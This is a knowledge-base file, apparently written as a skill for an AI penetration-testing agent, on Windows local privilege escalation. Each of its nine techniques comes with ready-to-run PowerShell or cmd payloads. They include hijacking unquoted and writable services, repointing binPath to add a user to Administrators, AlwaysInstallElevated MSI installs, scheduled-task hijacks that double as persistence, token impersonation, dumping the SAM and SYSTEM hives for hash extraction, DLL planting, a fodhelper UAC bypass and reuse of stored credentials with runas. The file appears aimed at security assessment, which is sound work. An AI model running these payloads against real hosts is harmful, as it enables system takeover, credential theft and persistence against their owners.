---
name: privilege-review
description: >-
  Windows Local Privilege Escalation — Knowledge Base — Native privesc only — manual checks that
  replace a host privesc-enumeration tool or a host enumeration tool. Each technique is the
  exploitation of a primitive found by `host-inventory/host-inventory.md`. Tier 0 unless a payload
  genuinely needs a compiled helper. Triggers: Windows privilege escalation, privesc, unquoted service
  path, weak service perms, AlwaysInstallElevated, SeImpersonate, token privilege, autorun, DLL
  hijack, registry privesc.
license: MIT
metadata:
  user-invocable: "false"
  origin: agents/privilege-review/windows.md (verbatim; frontmatter prefixado)
  progressive-disclosure: index-first
---
# Windows Local Privilege Escalation — Knowledge Base
_Last updated: 2026-06-22_

Native privesc only — manual checks that replace a host privesc-enumeration tool or a host enumeration tool. Each technique is the exploitation of a primitive found by `host-inventory/host-inventory.md`. Tier 0 unless a payload genuinely needs a compiled helper.

## Index
| # | Technique | When | Tier | Tags |
|---|-----------|------|------|------|
| T1 | Unquoted service path hijack | `host-inventory T3` flagged an unquoted Auto service with a writable parent dir | 0-native | windows-local, privesc, requires-admin-target-service |
| T2 | Weak service binary / ACL → replace binary | Auto SYSTEM service whose `.exe` or service config you can write | 0-native | windows-local, privesc |
| T3 | AlwaysInstallElevated MSI | Both AlwaysInstallElevated registry keys set | 0-native | windows-local, privesc, lolbin |
| T4 | Scheduled task hijack | SYSTEM/other-user task points at a writable script/binary | 0-native | windows-local, privesc, persistence |
| T5 | SeImpersonate token abuse (token-impersonation) | `whoami /priv` shows SeImpersonatePrivilege on a service context | 1-go | windows-local, privesc, tier1-go, token |
| T6 | SeBackup/SeRestore → SAM/SYSTEM read | Token has SeBackupPrivilege | 0-native | windows-local, privesc, cred-access, lolbin |
| T7 | DLL hijack / writable PATH dir | A privileged process loads a DLL from a dir you can write | 0-native | windows-local, privesc |
| T8 | UAC bypass via auto-elevate (fodhelper/sdclt) | You're admin but in a medium-integrity shell; need high integrity | 0-native | windows-local, privesc, uac, lolbin |
| T9 | Stored-credential reuse → runas | `host-inventory T5` found cmdkey/autologon/saved creds | 0-native | windows-local, privesc, cred-access |

## Techniques

### T1: Unquoted service path hijack
Tags: windows-local, privesc
When: `host-inventory T3` flagged an `Auto` service running as SYSTEM with an unquoted path containing spaces, and you can write to an earlier path segment.
Why: Windows resolves `C:\Program Files\My App\svc.exe` by trying `C:\Program.exe`, then `C:\Program Files\My.exe`, etc. If you can drop an executable at an earlier whitespace-split point and restart the service, it runs as SYSTEM. Pure native — just file write + service restart.
Tier: 0-native
Steps: 1. Confirm unquoted path + writable segment (`icacls`) 2. Drop your payload at the split point named for the segment 3. Restart the service (or wait for reboot)
Payload:
```powershell
# candidate: C:\Program Files\Vuln Service\svc.exe  (unquoted)
icacls "C:\Program Files\Vuln Service"          # need (W)/(M)/(F)
Copy-Item payload.exe "C:\Program Files\Vuln.exe"   # split at the space
sc.exe stop VulnSvc; sc.exe start VulnSvc            # or Restart-Service if permitted
```
Signal: the service starts your binary as `NT AUTHORITY\SYSTEM` (verify with a `whoami > C:\poc.txt` payload). | Pitfall: you usually can't restart the service as a low-priv user — check `sc sdshow` / wait for reboot; note that in the finding.
Source: distilled native privesc — 2026-06-22

### T2: Weak service binary / ACL → replace binary
Tags: windows-local, privesc
When: An Auto SYSTEM service whose binary you can overwrite, OR whose service config you can change (`SERVICE_CHANGE_CONFIG`).
Why: If you control the binary or can repoint `binPath`, the service runs your code as its account (often SYSTEM). The most direct service-based privesc.
Tier: 0-native
Steps: 1. Confirm write on the `.exe` (`icacls`) or `CHANGE_CONFIG` on the service 2. Replace the binary OR `sc config binPath=` 3. Restart
Payload:
```powershell
icacls "C:\path\svc.exe"                         # (M)/(F) for your group?
Copy-Item -Force payload.exe "C:\path\svc.exe"
# OR, with CHANGE_CONFIG:
sc.exe config VulnSvc binPath= "C:\Windows\System32\cmd.exe /c net localgroup administrators you /add"
sc.exe stop VulnSvc; sc.exe start VulnSvc
```
Signal: payload runs as the service account. | Pitfall: replacing a binary may break the service's own start (it expects a real service) — a service-control-handler shim or the `binPath=` one-shot command is more reliable.
Source: distilled native privesc — 2026-06-22

### T3: AlwaysInstallElevated MSI
Tags: windows-local, privesc, lolbin
When: Both `HKLM` and `HKCU` `AlwaysInstallElevated` = 1.
Why: With both keys set, any MSI installs as SYSTEM. You craft a minimal MSI and run it with `msiexec` (a native LOLBin) — no dropped exploit binary.
Tier: 0-native
Steps: 1. Confirm both keys 2. Build a payload MSI (or use a benign one with a custom action) 3. `msiexec /quiet /i payload.msi`
Payload:
```powershell
(Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer').AlwaysInstallElevated
(Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer').AlwaysInstallElevated
# both = 1  →
msiexec /quiet /qn /i C:\Temp\payload.msi
```
Signal: SYSTEM execution from the MSI custom action. | Pitfall: building the MSI without a tool — a tiny WiX/Tier-1 build or a hand-rolled MSI; if neither is feasible natively, note the primitive and raise a `@user` task for the MSI.
Source: distilled native privesc — 2026-06-22

### T4: Scheduled task hijack
Tags: windows-local, privesc, persistence
When: `host-inventory T4` found a SYSTEM/other-user task whose action target (script/binary) is in a dir you can write.
Why: Overwrite the target, and the task runs your code as its principal on the next trigger. Doubles as persistence.
Tier: 0-native
Steps: 1. Identify the task's action target + run-as 2. Confirm write 3. Replace + trigger (or wait for schedule)
Payload:
```powershell
$t = Get-ScheduledTask -TaskName 'VulnTask'
$t.Principal.UserId; $t.Actions.Execute            # who + what
icacls $t.Actions.Execute
Copy-Item -Force payload.exe $t.Actions.Execute
Start-ScheduledTask -TaskName 'VulnTask'           # if you can trigger it
```
Signal: code runs as the task principal. | Pitfall: triggering may require rights you lack — note the trigger schedule in the finding if you must wait.
Source: distilled native privesc — 2026-06-22

### T5: SeImpersonate token abuse (token-impersonation)
Tags: windows-local, privesc, tier1-go, token
When: `whoami /priv` shows `SeImpersonatePrivilege` enabled (common on service accounts, IIS/MSSQL contexts).
Why: With SeImpersonate, you can coerce a SYSTEM service to authenticate to a named pipe you control, then impersonate its token → SYSTEM. The technique (the token-impersonation class) is the deliverable; the *implementation* needs a small compiled helper because the named-pipe + token-duplication dance isn't expressible in pure PowerShell.
Tier: 1-go
Escalation: token impersonation via DuplicateTokenEx + named-pipe coercion requires Win32 API calls and precise handle timing that PowerShell can't do reliably; a small compiled helper (C#/Go via P/Invoke) is the minimal path — and it's something you build, not a tool you install (`flows-forge.md`).
Steps: 1. Confirm SeImpersonate enabled 2. Build/stage the token-impersonation helper (single file) 3. Run it with your command, get SYSTEM
Payload:
```powershell
whoami /priv | findstr SeImpersonate
# then run the forged helper (see flows-forge.md / forge.md):
.\tokenimpersonate.exe "cmd /c net localgroup administrators you /add"
```
Signal: command executes as SYSTEM. | Pitfall: exact variant depends on OS build (the token-impersonation variants) — fingerprint with `host-inventory T2` first. Alternatively, write the C# and compile in-memory via `Add-Type` (still Tier-0-ish since `csc.exe` ships with .NET) — prefer that if no Go.
Variations: `Add-Type`-compiled C# helper (Tier 0, uses in-box `csc`/Roslyn) where the .NET SDK is present — avoids a dropped binary entirely.
Source: distilled token-impersonation privesc, native-normalized — 2026-06-22

### T6: SeBackup/SeRestore → SAM/SYSTEM read
Tags: windows-local, privesc, cred-access, lolbin
When: Your token has `SeBackupPrivilege`.
Why: SeBackup lets you read any file ignoring DACLs — including the SAM/SYSTEM registry hives — without admin. Copy them out and extract local hashes offline. Pure native via `reg save` (which honors the backup privilege) or `robocopy /b`.
Tier: 0-native
Steps: 1. Confirm SeBackup 2. `reg save` the hives 3. Extract hashes offline (Tier-1 Python offline hash-extractor, no installed toolkit, or note for the user)
Payload:
```cmd
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
```
Signal: hive files written; local NTLM hashes extractable. | Pitfall: extraction itself (bootkey + hash decrypt) is a separate step — a stdlib Python script can do it (Tier 1, escalation: bootkey derivation is crypto PowerShell makes painful), or hand to the user. See `credential-review/credential-review.md#T4`.
Source: distilled native cred privesc — 2026-06-22

### T7: DLL hijack / writable PATH dir
Tags: windows-local, privesc
When: A privileged process or service loads a DLL by name from a search path that includes a dir you can write (or a missing DLL).
Why: Drop a malicious DLL where the privileged process looks first, and your `DllMain` runs in its context. Native: find the writable PATH entry, confirm the missing/hijackable DLL.
Tier: 0-native
Steps: 1. Find writable dirs on the system PATH (`icacls` each) 2. Identify a privileged process loading a DLL from there 3. Plant the DLL
Payload:
```powershell
$env:PATH -split ';' | % { if(Test-Path $_){ icacls $_ 2>$null | Select-String "$env:USERNAME|Users|Everyone" | % { "$_  <= $($_)" } } }
```
Signal: writable PATH dir earlier than System32 + a service that loads a non-KnownDLL. | Pitfall: KnownDLLs and SafeDllSearchMode block many classic hijacks — verify the target DLL isn't a KnownDLL.
Source: distilled native privesc — 2026-06-22

### T8: UAC bypass via auto-elevate (fodhelper/sdclt)
Tags: windows-local, privesc, uac, lolbin
When: You're a member of Administrators but in a medium-integrity shell, and need high integrity without a UAC prompt.
Why: Certain signed binaries auto-elevate and read a hijackable registry key (`fodhelper.exe` → `HKCU\Software\Classes\ms-settings\shell\open\command`). Set the key, run the binary, get a high-integrity process — all native registry + LOLBin.
Tier: 0-native
Steps: 1. Confirm admin membership + medium integrity 2. Plant the command in the hijack key 3. Run the auto-elevate binary
Payload:
```powershell
$k='HKCU:\Software\Classes\ms-settings\shell\open\command'
New-Item $k -Force | Out-Null
Set-ItemProperty $k -Name '(default)' -Value 'cmd.exe /c start cmd.exe'
Set-ItemProperty $k -Name 'DelegateExecute' -Value ''
Start-Process 'C:\Windows\System32\fodhelper.exe'
Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force   # cleanup
```
Signal: a high-integrity `cmd` spawns without a prompt. | Pitfall: only a *bypass of the prompt for an existing admin* — not a privesc from non-admin. Specific binaries get patched; have a fallback (`sdclt`, `computerdefaults`).
Source: distilled native UAC bypass — 2026-06-22

### T9: Stored-credential reuse → runas
Tags: windows-local, privesc, cred-access
When: `host-inventory T5` found `cmdkey`-stored creds, autologon password, or saved RDP/PuTTY creds.
Why: Stored creds for a higher-priv account let you `runas` directly — no exploit needed. The simplest privesc there is.
Tier: 0-native
Steps: 1. List stored creds 2. Use them via runas/savecred or a new session
Payload:
```cmd
cmdkey /list
runas /savecred /user:DOMAIN\admin "cmd /c whoami > C:\Temp\who.txt"
```
Signal: command runs as the stored account. | Pitfall: `/savecred` only works if the cred was stored for runas; `cmdkey` creds may be domain/Terminal-Server-scoped — test, don't assume.
Source: distilled native cred reuse — 2026-06-22
